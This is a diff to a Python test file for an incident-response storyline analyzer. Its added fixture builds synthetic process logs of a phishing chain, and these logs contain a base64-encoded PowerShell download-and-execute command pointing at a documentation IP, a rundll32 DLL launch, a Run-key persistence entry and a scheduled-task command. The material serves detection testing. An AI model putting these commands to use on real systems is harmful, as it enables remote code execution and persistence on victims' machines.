@@ -1,12 +1,14 @@
 """Story steps (§9.4), storyline gaps (§9.5) and scope (§5.7, §9.6)."""
 
+import base64
 from pathlib import Path
 
 import pytest
 
-from helpers.chain import EXPLORER, SYS32, Chain
+from helpers.chain import EXPLORER, SYS32, Chain, guid
 from lineage_ir.analyze.filters import make_params
 from lineage_ir.engine import AnalysisResult, run_analysis
+from lineage_ir.ingest.timeparse import format_rfc3339
 from lineage_ir.models import Gap, Storyline
 
 FIXTURES = Path(__file__).resolve().parents[1] / "fixtures"
@@ -63,16 +65,100 @@ def test_s1_steps(phish: AnalysisResult) -> None:
 def test_s2_steps_and_gap(phish: AnalysisResult) -> None:
     s2 = phish.storylines[1]
     actual = [(s.action, s.guid, s.technique) for s in s2.steps]
+    # GR-003 evidence is the execution record only (amendment 18): the drop by powershell.exe
+    # is not an S2 step.
     assert actual == [
-        ("finding", g(0xE1), "T1105"),
         ("process_create", g(0x91), "T1105"),
         ("process_create", g(0x92), "T1033"),
         ("process_create", g(0x93), "T1033"),
         ("process_create", g(0x94), "T1033"),
     ]
-    assert s2.steps[0].text == "Dropped file later executed: C:\\Users\\Public\\upd.exe"
-    assert s2.steps[1].text.endswith("[GR-003, LOC-001]")
-    assert s2.gaps == (Gap(after_step=1, seconds=3470),)
+    assert s2.steps[0].text.endswith("[GR-003, LOC-001]")
+    assert s2.gaps == ()
+
+
+def test_s2_starts_at_the_executed_process(phish: AnalysisResult) -> None:
+    s2 = phish.storylines[1]
+    assert format_rfc3339(s2.start_us) == "2026-10-12T11:00:00Z"
+    assert s2.start_us == s2.steps[0].ts_us
+    assert s2.gaps == ()
+
+
+def _reference_layout(path: Path) -> Path:
+    """The owner's reference phish_chain layout (base, without events 8 and 10)."""
+    office = "C:\\Program Files\\Microsoft Office\\root\\Office16\\"
+    ps = SYS32 + "WindowsPowerShell\\v1.0\\powershell.exe"
+    payload = "IEX(New-Object Net.WebClient).DownloadString('http://203.0.113.50/a')"
+    b64 = base64.b64encode(payload.encode("utf-16-le")).decode()
+    upd = "C:\\Users\\Public\\upd.exe"
+    chain = Chain().create(0x10, EXPLORER, 0x01, 0, "C:\\Windows\\Explorer.EXE")
+    chain.create(0x20, SYS32 + "svchost.exe", 0x02, 30, "svchost.exe -k netsvcs")
+    for n, second in enumerate((480, 960, 1440, 1920, 2400)):
+        if n % 2:
+            chain.create(0x30 + n, SYS32 + "taskhostw.exe", 0x20, second)
+        else:
+            chain.create(0x30 + n, SYS32 + "notepad.exe", 0x10, second)
+    chain.create(0xB1, office + "OUTLOOK.EXE", 0x10, 2460, parent_image=EXPLORER)
+    chain.create(
+        0xC1,
+        office + "WINWORD.EXE",
+        0xB1,
+        2518,
+        f'"{office}WINWORD.EXE" /n "C:\\Users\\jdoe\\Downloads\\invoice_oct.docm"',
+        office + "OUTLOOK.EXE",
+    )
+    chain.create(
+        0xD1,
+        SYS32 + "cmd.exe",
+        0xC1,
+        2523,
+        f"cmd.exe /c powershell -enc {b64}",
+        office + "WINWORD.EXE",
+    )
+    chain.create(0xE1, ps, 0xD1, 2524, f"powershell -enc {b64}", SYS32 + "cmd.exe")
+    chain.connect(0xE1, 2525, "203.0.113.50", 80, Image=ps)
+    chain.event(22, 0xE1, 2525, Image=ps, QueryName="update-cdn.example", QueryStatus="0")
+    chain.event(11, 0xE1, 2527, Image=ps, TargetFilename="C:\\Users\\Public\\a.dll")
+    chain.event(11, 0xE1, 2528, Image=ps, TargetFilename=upd)
+    chain.create(
+        0xF1, SYS32 + "rundll32.exe", 0xE1, 2529, "rundll32.exe C:\\Users\\Public\\a.dll,Start", ps
+    )
+    chain.connect(0xF1, 2530, "203.0.113.50", 443)
+    chain.event(
+        13,
+        0xF1,
+        2531,
+        Image=SYS32 + "rundll32.exe",
+        EventType="SetValue",
+        TargetObject="HKU\\S-1-5-21-1-2-3-1001\\Software\\Microsoft\\Windows\\CurrentVersion"
+        "\\Run\\Updater",
+        Details=upd,
+    )
+    chain.create(0x91, upd, 0x10, 5342, upd, EXPLORER)
+    chain.create(
+        0x92,
+        SYS32 + "schtasks.exe",
+        0x91,
+        5345,
+        f"schtasks.exe /create /tn Updater /tr {upd} /sc onlogon",
+        upd,
+    )
+    for n, second in enumerate((5400, 5880, 6360)):
+        chain.create(0x60 + n, SYS32 + "notepad.exe", 0x10, second)
+    return chain.write(path)
+
+
+def test_reference_layout_s2_starts_at_upd_with_no_gap(tmp_path: Path) -> None:
+    result = run_analysis([_reference_layout(tmp_path / "reference.jsonl")])
+    s1, s2 = result.storylines
+    assert (s1.root_image_name, s2.root_image_name) == ("outlook.exe", "upd.exe")
+    assert format_rfc3339(s2.start_us) == "2026-10-12T11:29:02Z"
+    assert [(s.action, s.guid) for s in s2.steps] == [
+        ("process_create", guid(0x91)),
+        ("process_create", guid(0x92)),
+    ]
+    assert s1.gaps == () and s2.gaps == ()
+    assert [gap.seconds for gap in result.coverage.timeline.gaps] == [2811]
 
 
 def test_steps_are_numbered_in_time_order(phish: AnalysisResult) -> None:
